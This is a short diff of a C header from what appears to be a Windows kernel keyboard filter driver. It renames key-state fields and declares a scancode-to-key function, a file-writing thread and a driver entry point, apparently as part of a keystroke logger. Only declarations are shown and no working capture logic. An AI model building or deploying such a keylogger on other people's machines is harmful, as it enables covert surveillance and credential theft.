@@ -1,12 +1,12 @@
 #include <ntddk.h>
-#include <Ntddkbd.h>
+#include <ntddkbd.h>
 
 typedef struct 
 {
-	BOOLEAN kSHIFT;
-	BOOLEAN kCAPSLOCK;
-	BOOLEAN kCTRL;
-	BOOLEAN kALT;
+	BOOLEAN shift;
+	BOOLEAN capslock;
+	BOOLEAN ctrl;
+	BOOLEAN alt;
 } KEY_STATE;
 
 //??? 
@@ -61,13 +61,11 @@ VOID ThreadForWriting(PVOID pContext);
 //Функция инициализации потока
 NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject);
 
-char* Scancode2Key(char scanCode, char* keys);
+char* Scancode2Key(PDEVICE_EXTENSION pDeviceExtension, KEY_DATA* kData, char* keys);
 
 NTSTATUS CreateFile(PDRIVER_OBJECT pDriverObject);
 
 
 //Входная точка
-//PDRIVER_OBJECT - адрес объекта драйвера
-//PUNICODE_STRING - путь в реестре к подразделу драйвера
 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
 
